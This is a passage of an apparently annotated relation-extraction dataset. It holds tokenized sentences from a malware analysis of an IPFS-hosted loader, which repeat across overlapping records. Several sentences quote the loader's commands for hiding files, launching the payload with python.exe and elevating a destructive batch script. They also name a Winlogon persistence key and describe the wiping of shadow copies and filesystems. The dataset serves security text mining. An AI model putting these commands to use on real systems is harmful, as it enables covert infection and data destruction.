"RD", "evidence": [4], "t": 14, "h": 15}, {"r": "RD", "evidence": [4], "t": 14, "h": 15}, {"r": "WR", "evidence": [4], "t": 14, "h": 15}, {"r": "ST", "evidence": [4], "h": 15, "t": 16}, {"r": "RF", "evidence": [4], "h": 15, "t": 16}, {"r": "ST", "evidence": [4], "h": 15, "t": 16}, {"r": "RF", "evidence": [4], "h": 15, "t": 16}, {"r": "ST", "evidence": [4, 5], "t": 16, "h": 17}, {"r": "RF", "evidence": [4, 5], "t": 16, "h": 17}, {"r": "ST", "evidence": [4, 5], "t": 16, "h": 17}, {"r": "RF", "evidence": [4, 5], "t": 16, "h": 17}, {"r": "ST", "evidence": [4, 5], "t": 16, "h": 18}, {"r": "RF", "evidence": [4, 5], "t": 16, "h": 18}]}, {"title": "608-27", "sents": [["An", "example", "of", "the", "loader", "retrieving", "Hannabi", "Grabber", ",", "an", "information", "stealer", "written", "in", "Python", "is", "shown", "below", "."], ["The", "loader", "then", "uses", "the", "attrib.exe", "utility", "to", "set", "the", "System", "and", "Hidden", "flags", "on", "the", "previously", "created", "directory", "as", "well", "as", "the", "Python", "ZIP", "archive", "and", "final", "payload", "that", "was", "retrieved", "."], ["4-embed-amd64.zipC", ":", "\\Windows\\system32\\cmd.exe", "/c", "attrib", "+S", "+H", "%", "appdata", "%", "\\Microsoft\\Network\\Packages.txtFinally", ",", "the", "loader", "invokes", "the", "newly", "downloaded", "Python", "executable", "and", "passes", "the", "final", "payload", "as", "a", "command", "line", "argument", ",", "executing", "the", "next", "stage", "of", "the", "infection", "process", "."], ["C", ":", "\\Windows\\system32\\cmd.exe", "/c", "cd", "%", "appdata", "%", "\\Microsoft\\Network", "&", "&", "python.exe", "Packages.txtIn", "some", "cases", ",", "the", "malware", "was", "also", "observed", "achieving", "persistence", "via", "adding", "entries", "into", "the", "Windows", "registry", "at", "the", "following", "locations", ":", "HKLM\\Software\\Microsoft\\WindowsNT\\CurrentVersion\\Winlogon", "our", "analysis", "of", "samples", "associated", "with", "this", "loader", ",", "we", "observed", "that", "the", "IPFS", "gateway", "that", "was", "being", "used", "was", "no", "longer", "servicing", "requests", ",", "however", ",", "Talos", "obtained", "the", "ne"], ["Reverse", "shellIn", "one", "of", "the", "clusters", "leveraging", "this", "loader", ",", "we", "observed", "that", "the", "payload", "being", "hosted", "within", "the", "IPFS", "network", "was", "a", "Python", "script", "containing", "a", "large", "base64", "encoded", "blob", "along", "with", "the", "Python", "code", "responsible", "for", "decoding", "the", "base64", "."], ["After", "decoding", "all", "of", "the", "layers", ",", "the", "following", "is", "the", "deobfuscated", "reverse", "shell", "payload", "."], ["At", "the", "time", "of", "analysis", ",", "the", "C2", "server", "was", "no", "longer", "servicing", "requests", "on", "TCP/4444", "."], ["Destructive", "MalwareIn", "another", "cluster", "we", "analyzed", ",", "we", "observed", "that", "the", "final", "payload", "hosted", "within", "IPFS", "was", "a", "Windows", "batch", "file", ",", "as", "shown", "below", ":", "When", "the", "batch", "file", "is", "retrieved", ",", "it", "is", "stored", "within", "the", "Network", "directory", "using", "the", "filename", "``", "Script.bat", "''", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [4, 4], "name": "loader", "pos": [4, 5], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [6, 6], "name": "Hannabi Grabber", "pos": [6, 8], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [20, 20], "name": "loader", "pos": [1, 2], "index": "2_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [24, 24], "name": "attrib.exe", "pos": [5, 6], "index": "3_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [42, 42], "name": "Python ZIP archive", "pos": [23, 26], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [47, 47], "name": "payload", "pos": [28, 29], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [65, 65], "name": "loader", "pos": [13, 14], "index": "6_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [70, 70], "name": "Python executable", "pos": [18, 20], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [76, 76], "name": "payload", "pos": [24, 25], "index": "8_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [109, 109], "name": "malware", "pos": [17, 18], "index": "9_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [120, 120], "name": "Windows registry", "pos": [28, 30], "index": "10_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [135, 135], "name": "loader", "pos": [43, 44], "index": "11_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [141, 141], "name": "IPFS gateway", "pos": [49, 51], "index": "12_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [167, 167], "name": "loader", "pos": [8, 9], "index": "13_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [173, 173], "name": "payload", "pos": [14, 15], "index": "14_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [246, 246], "name": "payload", "pos": [12, 13], "index": "15_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [262, 262], "name": "batch file", "pos": [28, 30], "index": "16_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [267, 267], "name": "it", "pos": [33, 34], "index": "17_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [278, 278], "name": "Script.bat", "pos": [44, 45], "index": "18_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "FR", "evidence": [1], "h": 2, "t": 3}, {"r": "CD", "evidence": [1], "h": 3, "t": 4}, {"r": "CD", "evidence": [1], "h": 3, "t": 5}, {"r": "FR", "evidence": [2], "h": 6, "t": 7}, {"r": "EX", "evidence": [1, 2], "t": 4, "h": 7}, {"r": "RD", "evidence": [2], "h": 7, "t": 8}, {"r": "RD", "evidence": [3], "h": 9, "t": 10}, {"r": "RD", "evidence": [3], "h": 9, "t": 10}, {"r": "WR", "evidence": [3], "h": 9, "t": 10}, {"r": "RD", "evidence": [3], "t": 10, "h": 11}, {"r": "RD", "evidence": [3], "t": 10, "h": 11}, {"r": "WR", "evidence": [3], "t": 10, "h": 11}, {"r": "ST", "evidence": [3], "h": 11, "t": 12}, {"r": "RF", "evidence": [3], "h": 11, "t": 12}, {"r": "ST", "evidence": [3], "h": 11, "t": 12}, {"r": "RF", "evidence": [3], "h": 11, "t": 12}, {"r": "ST", "evidence": [3, 4], "t": 12, "h": 13}, {"r": "RF", "evidence": [3, 4], "t": 12, "h": 13}, {"r": "ST", "evidence": [3, 4], "t": 12, "h": 13}, {"r": "RF", "evidence": [3, 4], "t": 12, "h": 13}, {"r": "ST", "evidence": [3, 4], "t": 12, "h": 14}, {"r": "RF", "evidence": [3, 4], "t": 12, "h": 14}, {"r": "CO", "evidence": [4, 5, 6, 7], "h": 14, "t": 15}, {"r": "EX", "evidence": [7], "t": 17, "h": 18}, {"r": "CO", "evidence": [7], "h": 16, "t": 17}]}, {"title": "608-28", "sents": [["The", "loader", "then", "uses", "the", "attrib.exe", "utility", "to", "set", "the", "System", "and", "Hidden", "flags", "on", "the", "previously", "created", "directory", "as", "well", "as", "the", "Python", "ZIP", "archive", "and", "final", "payload", "that", "was", "retrieved", "."], ["4-embed-amd64.zipC", ":", "\\Windows\\system32\\cmd.exe", "/c", "attrib", "+S", "+H", "%", "appdata", "%", "\\Microsoft\\Network\\Packages.txtFinally", ",", "the", "loader", "invokes", "the", "newly", "downloaded", "Python", "executable", "and", "passes", "the", "final", "payload", "as", "a", "command", "line", "argument", ",", "executing", "the", "next", "stage", "of", "the", "infection", "process", "."], ["C", ":", "\\Windows\\system32\\cmd.exe", "/c", "cd", "%", "appdata", "%", "\\Microsoft\\Network", "&", "&", "python.exe", "Packages.txtIn", "some", "cases", ",", "the", "malware", "was", "also", "observed", "achieving", "persistence", "via", "adding", "entries", "into", "the", "Windows", "registry", "at", "the", "following", "locations", ":", "HKLM\\Software\\Microsoft\\WindowsNT\\CurrentVersion\\Winlogon", "our", "analysis", "of", "samples", "associated", "with", "this", "loader", ",", "we", "observed", "that", "the", "IPFS", "gateway", "that", "was", "being", "used", "was", "no", "longer", "servicing", "requests", ",", "however", ",", "Talos", "obtained", "the", "ne"], ["Reverse", "shellIn", "one", "of", "the", "clusters", "leveraging", "this", "loader", ",", "we", "observed", "that", "the", "payload", "being", "hosted", "within", "the", "IPFS", "network", "was", "a", "Python", "script", "containing", "a", "large", "base64", "encoded", "blob", "along", "with", "the", "Python", "code", "responsible", "for", "decoding", "the", "base64", "."], ["After", "decoding", "all", "of", "the", "layers", ",", "the", "following", "is", "the", "deobfuscated", "reverse", "shell", "payload", "."], ["At", "the", "time", "of", "analysis", ",", "the", "C2", "server", "was", "no", "longer", "servicing", "requests", "on", "TCP/4444", "."], ["Destructive", "MalwareIn", "another", "cluster", "we", "analyzed", ",", "we", "observed", "that", "the", "final", "payload", "hosted", "within", "IPFS", "was", "a", "Windows", "batch", "file", ",", "as", "shown", "below", ":", "When", "the", "batch", "file", "is", "retrieved", ",", "it", "is", "stored", "within", "the", "Network", "directory", "using", "the", "filename", "``", "Script.bat", "''", "."], ["This", "batch", "file", "is", "responsible", "for", "the", "following", "destructive", "behavior", ":", "Deleting", "volume", "shadow", "copies", "on", "the", "system", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "loader", "pos": [1, 2], "index": "0_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [5, 5], "name": "attrib.exe", "pos": [5, 6], "index": "1_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [23, 23], "name": "Python ZIP archive", "pos": [23, 26], "index": "2_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [28, 28], "name": "payload", "pos": [28, 29], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [46, 46], "name": "loader", "pos": [13, 14], "index": "4_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [51, 51], "name": "Python executable", "pos": [18, 20], "index": "5_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [57, 57], "name": "payload", "pos": [24, 25], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [90, 90], "name": "malware", "pos": [17, 18], "index": "7_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [101, 101], "name": "Windows registry", "pos": [28, 30], "index": "8_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [116, 116], "name": "loader", "pos": [43, 44], "index": "9_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [122, 122], "name": "IPFS gateway", "pos": [49, 51], "index": "10_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [148, 148], "name": "loader", "pos": [8, 9], "index": "11_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [154, 154], "name": "payload", "pos": [14, 15], "index": "12_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [227, 227], "name": "payload", "pos": [12, 13], "index": "13_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [243, 243], "name": "batch file", "pos": [28, 30], "index": "14_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [248, 248], "name": "it", "pos": [33, 34], "index": "15_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [259, 259], "name": "Script.bat", "pos": [44, 45], "index": "16_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [274, 274], "name": "volume shadow copies", "pos": [12, 15], "index": "17_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 1}, {"r": "CD", "evidence": [0], "h": 1, "t": 2}, {"r": "CD", "evidence": [0], "h": 1, "t": 3}, {"r": "FR", "evidence": [1], "h": 4, "t": 5}, {"r": "EX", "evidence": [0, 1], "t": 2, "h": 5}, {"r": "RD", "evidence": [1], "h": 5, "t": 6}, {"r": "RD", "evidence": [2], "h": 7, "t": 8}, {"r": "RD", "evidence": [2], "h": 7, "t": 8}, {"r": "WR", "evidence": [2], "h": 7, "t": 8}, {"r": "RD", "evidence": [2], "t": 8, "h": 9}, {"r": "RD", "evidence": [2], "t": 8, "h": 9}, {"r": "WR", "evidence": [2], "t": 8, "h": 9}, {"r": "ST", "evidence": [2], "h": 9, "t": 10}, {"r": "RF", "evidence": [2], "h": 9, "t": 10}, {"r": "ST", "evidence": [2], "h": 9, "t": 10}, {"r": "RF", "evidence": [2], "h": 9, "t": 10}, {"r": "ST", "evidence": [2, 3], "t": 10, "h": 11}, {"r": "RF", "evidence": [2, 3], "t": 10, "h": 11}, {"r": "ST", "evidence": [2, 3], "t": 10, "h": 11}, {"r": "RF", "evidence": [2, 3], "t": 10, "h": 11}, {"r": "RD", "evidence": [3, 4, 5, 6, 7], "h": 11, "t": 17}, {"r": "RD", "evidence": [3, 4, 5, 6, 7], "h": 11, "t": 17}, {"r": "WR", "evidence": [3, 4, 5, 6, 7], "h": 11, "t": 17}, {"r": "ST", "evidence": [2, 3], "t": 10, "h": 12}, {"r": "RF", "evidence": [2, 3], "t": 10, "h": 12}, {"r": "RD", "evidence": [3, 4, 5, 6, 7], "h": 12, "t": 17}, {"r": "CO", "evidence": [3, 4, 5, 6], "h": 12, "t": 13}, {"r": "EX", "evidence": [6], "t": 15, "h": 16}, {"r": "RD", "evidence": [6, 7], "h": 13, "t": 17}, {"r": "WR", "evidence": [6, 7], "h": 13, "t": 17}, {"r": "RD", "evidence": [6, 7], "h": 16, "t": 17}, {"r": "RD", "evidence": [6, 7], "h": 16, "t": 17}, {"r": "WR", "evidence": [6, 7], "h": 16, "t": 17}, {"r": "CO", "evidence": [6], "h": 14, "t": 15}]}, {"title": "608-29", "sents": [["4-embed-amd64.zipC", ":", "\\Windows\\system32\\cmd.exe", "/c", "attrib", "+S", "+H", "%", "appdata", "%", "\\Microsoft\\Network\\Packages.txtFinally", ",", "the", "loader", "invokes", "the", "newly", "downloaded", "Python", "executable", "and", "passes", "the", "final", "payload", "as", "a", "command", "line", "argument", ",", "executing", "the", "next", "stage", "of", "the", "infection", "process", "."], ["C", ":", "\\Windows\\system32\\cmd.exe", "/c", "cd", "%", "appdata", "%", "\\Microsoft\\Network", "&", "&", "python.exe", "Packages.txtIn", "some", "cases", ",", "the", "malware", "was", "also", "observed", "achieving", "persistence", "via", "adding", "entries", "into", "the", "Windows", "registry", "at", "the", "following", "locations", ":", "HKLM\\Software\\Microsoft\\WindowsNT\\CurrentVersion\\Winlogon", "our", "analysis", "of", "samples", "associated", "with", "this", "loader", ",", "we", "observed", "that", "the", "IPFS", "gateway", "that", "was", "being", "used", "was", "no", "longer", "servicing", "requests", ",", "however", ",", "Talos", "obtained", "the", "ne"], ["Reverse", "shellIn", "one", "of", "the", "clusters", "leveraging", "this", "loader", ",", "we", "observed", "that", "the", "payload", "being", "hosted", "within", "the", "IPFS", "network", "was", "a", "Python", "script", "containing", "a", "large", "base64", "encoded", "blob", "along", "with", "the", "Python", "code", "responsible", "for", "decoding", "the", "base64", "."], ["After", "decoding", "all", "of", "the", "layers", ",", "the", "following", "is", "the", "deobfuscated", "reverse", "shell", "payload", "."], ["At", "the", "time", "of", "analysis", ",", "the", "C2", "server", "was", "no", "longer", "servicing", "requests", "on", "TCP/4444", "."], ["Destructive", "MalwareIn", "another", "cluster", "we", "analyzed", ",", "we", "observed", "that", "the", "final", "payload", "hosted", "within", "IPFS", "was", "a", "Windows", "batch", "file", ",", "as", "shown", "below", ":", "When", "the", "batch", "file", "is", "retrieved", ",", "it", "is", "stored", "within", "the", "Network", "directory", "using", "the", "filename", "``", "Script.bat", "''", "."], ["This", "batch", "file", "is", "responsible", "for", "the", "following", "destructive", "behavior", ":", "Deleting", "volume", "shadow", "copies", "on", "the", "system", "."], ["Iterating", "through", "all", "mounted", "filesystems", "present", "on", "the", "system", "and", "deleting", "contents", "stored", "on", "them", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [13, 13], "name": "loader", "pos": [13, 14], "index": "0_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [18, 18], "name": "Python executable", "pos": [18, 20], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [24, 24], "name": "payload", "pos": [24, 25], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [57, 57], "name": "malware", "pos": [17, 18], "index": "3_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [68, 68], "name": "Windows registry", "pos": [28, 30], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [83, 83], "name": "loader", "pos": [43, 44], "index": "5_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [89, 89], "name": "IPFS gateway", "pos": [49, 51], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [115, 115], "name": "loader", "pos": [8, 9], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [121, 121], "name": "payload", "pos": [14, 15], "index": "8_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [194, 194], "name": "payload", "pos": [12, 13], "index": "9_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [210, 210], "name": "batch file", "pos": [28, 30], "index": "10_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [215, 215], "name": "it", "pos": [33, 34], "index": "11_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [226, 226], "name": "Script.bat", "pos": [44, 45], "index": "12_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [241, 241], "name": "volume shadow copies", "pos": [12, 15], "index": "13_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [251, 251], "name": "mounted filesystems", "pos": [3, 5], "index": "14_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 1}, {"r": "RD", "evidence": [0], "h": 1, "t": 2}, {"r": "RD", "evidence": [1], "h": 3, "t": 4}, {"r": "RD", "evidence": [1], "h": 3, "t": 4}, {"r": "WR", "evidence": [1], "h": 3, "t": 4}, {"r": "RD", "evidence": [1], "t": 4, "h": 5}, {"r": "RD", "evidence": [1], "t": 4, "h": 5}, {"r": "WR", "evidence": [1], "t": 4, "h": 5}, {"r": "ST", "evidence": [1], "h": 5, "t": 6}, {"r": "RF", "evidence": [1], "h": 5, "t": 6}, {"r": "ST", "evidence": [1], "h": 5, "t": 6}, {"r": "RF", "evidence": [1], "h": 5, "t": 6}, {"r": "ST", "evidence": [1, 2], "t": 6, "h": 7}, {"r": "RF", "evidence": [1, 2], "t": 6, "h": 7}, {"r": "ST", "evidence": [1, 2], "t": 6, "h": 7}, {"r": "RF", "evidence": [1, 2], "t": 6, "h": 7}, {"r": "RD", "evidence": [2, 3, 4, 5, 6], "h": 7, "t": 13}, {"r": "RD", "evidence": [2, 3, 4, 5, 6], "h": 7, "t": 13}, {"r": "WR", "evidence": [2, 3, 4, 5, 6], "h": 7, "t": 13}, {"r": "ST", "evidence": [1, 2], "t": 6, "h": 8}, {"r": "RF", "evidence": [1, 2], "t": 6, "h": 8}, {"r": "RD", "evidence": [2, 3, 4, 5, 6], "h": 8, "t": 13}, {"r": "CO", "evidence": [2, 3, 4, 5], "h": 8, "t": 9}, {"r": "EX", "evidence": [5], "t": 11, "h": 12}, {"r": "RD", "evidence": [5, 6], "h": 9, "t": 13}, {"r": "WR", "evidence": [5, 6], "h": 9, "t": 13}, {"r": "RD", "evidence": [5, 6], "h": 12, "t": 13}, {"r": "RD", "evidence": [5, 6], "h": 12, "t": 13}, {"r": "WR", "evidence": [5, 6], "h": 12, "t": 13}, {"r": "RD", "evidence": [5, 6, 7], "h": 12, "t": 14}, {"r": "RD", "evidence": [5, 6, 7], "h": 12, "t": 14}, {"r": "WR", "evidence": [5, 6, 7], "h": 12, "t": 14}, {"r": "CO", "evidence": [5], "h": 10, "t": 11}]}, {"title": "608-30", "sents": [["C", ":", "\\Windows\\system32\\cmd.exe", "/c", "cd", "%", "appdata", "%", "\\Microsoft\\Network", "&", "&", "python.exe", "Packages.txtIn", "some", "cases", ",", "the", "malware", "was", "also", "observed", "achieving", "persistence", "via", "adding", "entries", "into", "the", "Windows", "registry", "at", "the", "following", "locations", ":", "HKLM\\Software\\Microsoft\\WindowsNT\\CurrentVersion\\Winlogon", "our", "analysis", "of", "samples", "associated", "with", "this", "loader", ",", "we", "observed", "that", "the", "IPFS", "gateway", "that", "was", "being", "used", "was", "no", "longer", "servicing", "requests", ",", "however", ",", "Talos", "obtained", "the", "ne"], ["Reverse", "shellIn", "one", "of", "the", "clusters", "leveraging", "this", "loader", ",", "we", "observed", "that", "the", "payload", "being", "hosted", "within", "the", "IPFS", "network", "was", "a", "Python", "script", "containing", "a", "large", "base64", "encoded", "blob", "along", "with", "the", "Python", "code", "responsible", "for", "decoding", "the", "base64", "."], ["After", "decoding", "all", "of", "the", "layers", ",", "the", "following", "is", "the", "deobfuscated", "reverse", "shell", "payload", "."], ["At", "the", "time", "of", "analysis", ",", "the", "C2", "server", "was", "no", "longer", "servicing", "requests", "on", "TCP/4444", "."], ["Destructive", "MalwareIn", "another", "cluster", "we", "analyzed", ",", "we", "observed", "that", "the", "final", "payload", "hosted", "within", "IPFS", "was", "a", "Windows", "batch", "file", ",", "as", "shown", "below", ":", "When", "the", "batch", "file", "is", "retrieved", ",", "it", "is", "stored", "within", "the", "Network", "directory", "using", "the", "filename", "``", "Script.bat", "''", "."], ["This", "batch", "file", "is", "responsible", "for", "the", "following", "destructive", "behavior", ":", "Deleting", "volume", "shadow", "copies", "on", "the", "system", "."], ["Iterating", "through", "all", "mounted", "filesystems", "present", "on", "the", "system", "and", "deleting", "contents", "stored", "on", "them", "."], ["Fortunately", "for", "victims", ",", "in", "the", "samples", "analyzed", "the", "loader", "incorrectly", "attempts", "to", "invoke", "the", "batch", "file", "as", "shown", "below", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [17, 17], "name": "malware", "pos": [17, 18], "index": "0_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [28, 28], "name": "Windows registry", "pos": [28, 30], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [43, 43], "name": "loader", "pos": [43, 44], "index": "2_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [49, 49], "name": "IPFS gateway", "pos": [49, 51], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [75, 75], "name": "loader", "pos": [8, 9], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [81, 81], "name": "payload", "pos": [14, 15], "index": "5_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [154, 154], "name": "payload", "pos": [12, 13], "index": "6_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [170, 170], "name": "batch file", "pos": [28, 30], "index": "7_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [175, 175], "name": "it", "pos": [33, 34], "index": "8_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [186, 186], "name": "Script.bat", "pos": [44, 45], "index": "9_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [201, 201], "name": "volume shadow copies", "pos": [12, 15], "index": "10_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [211, 211], "name": "mounted filesystems", "pos": [3, 5], "index": "11_0"}]], "labels": [{"r": "RD", "evidence": [0], "h": 0, "t": 1}, {"r": "RD", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "RD", "evidence": [0], "t": 1, "h": 2}, {"r": "RD", "evidence": [0], "t": 1, "h": 2}, {"r": "WR", "evidence": [0], "t": 1, "h": 2}, {"r": "ST", "evidence": [0], "h": 2, "t": 3}, {"r": "RF", "evidence": [0], "h": 2, "t": 3}, {"r": "ST", "evidence": [0], "h": 2, "t": 3}, {"r": "RF", "evidence": [0], "h": 2, "t": 3}, {"r": "ST", "evidence": [0, 1], "t": 3, "h": 4}, {"r": "RF", "evidence": [0, 1], "t": 3, "h": 4}, {"r": "ST", "evidence": [0, 1], "t": 3, "h": 4}, {"r": "RF", "evidence": [0, 1], "t": 3, "h": 4}, {"r": "RD", "evidence": [1, 2, 3, 4, 5], "h": 4, "t": 10}, {"r": "RD", "evidence": [1, 2, 3, 4, 5], "h": 4, "t": 10}, {"r": "WR", "evidence": [1, 2, 3, 4, 5], "h": 4, "t": 10}, {"r": "ST", "evidence": [0, 1], "t": 3, "h": 5}, {"r": "RF", "evidence": [0, 1], "t": 3, "h": 5}, {"r": "RD", "evidence": [1, 2, 3, 4, 5], "h": 5, "t": 10}, {"r": "CO", "evidence": [1, 2, 3, 4], "h": 5, "t": 6}, {"r": "EX", "evidence": [4], "t": 8, "h": 9}, {"r": "RD", "evidence": [4, 5], "h": 6, "t": 10}, {"r": "WR", "evidence": [4, 5], "h": 6, "t": 10}, {"r": "RD", "evidence": [4, 5], "h": 9, "t": 10}, {"r": "RD", "evidence": [4, 5], "h": 9, "t": 10}, {"r": "WR", "evidence": [4, 5], "h": 9, "t": 10}, {"r": "RD", "evidence": [4, 5, 6], "h": 9, "t": 11}, {"r": "RD", "evidence": [4, 5, 6], "h": 9, "t": 11}, {"r": "WR", "evidence": [4, 5, 6], "h": 9, "t": 11}, {"r": "CO", "evidence": [4], "h": 7, "t": 8}]}, {"title": "608-31", "sents": [["Reverse", "shellIn", "one", "of", "the", "clusters", "leveraging", "this", "loader", ",", "we", "observed", "that", "the", "payload", "being", "hosted", "within", "the", "IPFS", "network", "was", "a", "Python", "script", "containing", "a", "large", "base64", "encoded", "blob", "along", "with", "the", "Python", "code", "responsible", "for", "decoding", "the", "base64", "."], ["After", "decoding", "all", "of", "the", "layers", ",", "the", "following", "is", "the", "deobfuscated", "reverse", "shell", "payload", "."], ["At", "the", "time", "of", "analysis", ",", "the", "C2", "server", "was", "no", "longer", "servicing", "requests", "on", "TCP/4444", "."], ["Destructive", "MalwareIn", "another", "cluster", "we", "analyzed", ",", "we", "observed", "that", "the", "final", "payload", "hosted", "within", "IPFS", "was", "a", "Windows", "batch", "file", ",", "as", "shown", "below", ":", "When", "the", "batch", "file", "is", "retrieved", ",", "it", "is", "stored", "within", "the", "Network", "directory", "using", "the", "filename", "``", "Script.bat", "''", "."], ["This", "batch", "file", "is", "responsible", "for", "the", "following", "destructive", "behavior", ":", "Deleting", "volume", "shadow", "copies", "on", "the", "system", "."], ["Iterating", "through", "all", "mounted", "filesystems", "present", "on", "the", "system", "and", "deleting", "contents", "stored", "on", "them", "."], ["Fortunately", "for", "victims", ",", "in", "the", "samples", "analyzed", "the", "loader", "incorrectly", "attempts", "to", "invoke", "the", "batch", "file", "as", "shown", "below", "."], ["C", ":", "\\Windows\\system32\\cmd.exe", "/c", "cd", "%", "appdata", "%", "\\Microsoft\\Network", "&", "&", "powershell", "-Command", "start", "script.bat", "-Verb", "RunAsHannabi", "GrabberThe", "final", "cluster", "of", "malware", "associated", "with", "this", "loader", "is", "responsible", "for", "retrieving", "and", "executing", "a", "Python-based", "information", "stealer", "called", "Hannabi", "Grabber", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [8, 8], "name": "loader", "pos": [8, 9], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [14, 14], "name": "payload", "pos": [14, 15], "index": "1_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [87, 87], "name": "payload", "pos": [12, 13], "index": "2_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [103, 103], "name": "batch file", "pos": [28, 30], "index": "3_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [108, 108], "name": "it", "pos": [33, 34], "index": "4_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [119, 119], "name": "Script.bat", "pos": [44, 45], "index": "5_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [134, 134], "name": "volume shadow copies", "pos": [12, 15], "index": "6_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [144, 144], "name": "mounted filesystems", "pos": [3, 5], "index": "7_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [199, 199], "name": "malware", "pos": [21, 22], "index": "8_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [203, 203], "name": "loader", "pos": [25, 26], "index": "9_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [215, 215], "name": "Hannabi Grabber", "pos": [37, 39], "index": "10_0"}]], "labels": [{"r": "RD", "evidence": [0, 1, 2, 3, 4], "h": 0, "t": 6}, {"r": "RD", "evidence": [0, 1, 2, 3, 4], "h": 0, "t": 6}, {"r": "WR", "evidence": [0, 1, 2, 3, 4], "h": 0, "t": 6}, {"r": "RD", "evidence": [0, 1, 2, 3, 4], "h": 1, "t": 6}, {"r": "CO", "evidence": [0, 1, 2, 3], "h": 1, "t": 2}, {"r": "EX", "evidence": [3], "t": 4, "h": 5}, {"r": "RD", "evidence": [3, 4], "h": 2, "t": 6}, {"r": "WR", "evidence": [3, 4], "h": 2, "t": 6}, {"r": "RD", "evidence": [3, 4], "h": 5, "t": 6}, {"r": "RD", "evidence": [3, 4], "h": 5, "t": 6}, {"r": "WR", "evidence": [3, 4], "h": 5, "t": 6}, {"r": "RD", "evidence": [3, 4, 5], "h": 5, "t": 7}, {"r": "RD", "evidence": [3, 4, 5], "h": 5, "t": 7}, {"r": "WR", "evidence": [3, 4, 5], "h": 5, "t": 7}, {"r": "CO", "evidence": [3], "h": 3, "t": 4}, {"r": "FR", "evidence": [7], "h": 8, "t": 9}, {"r": "CO", "evidence": [7], "h": 9, "t": 10}]}, {"title": "608-32", "sents": [["After", "decoding", "all", "of", "the", "layers", ",", "the", "following", "is", "the", "deobfuscated", "reverse", "shell", "payload", "."], ["At", "the", "time", "of", "analysis", ",", "the", "C2", "server", "was", "no", "longer", "servicing", "requests", "on", "TCP/4444", "."], ["Destructive", "MalwareIn", "another", "cluster", "we", "analyzed", ",", "we", "observed", "that", "the", "final", "payload", "hosted", "within", "IPFS", "was", "a", "Windows", "batch", "file", ",", "as", "shown", "below", ":", "When", "the", "batch", 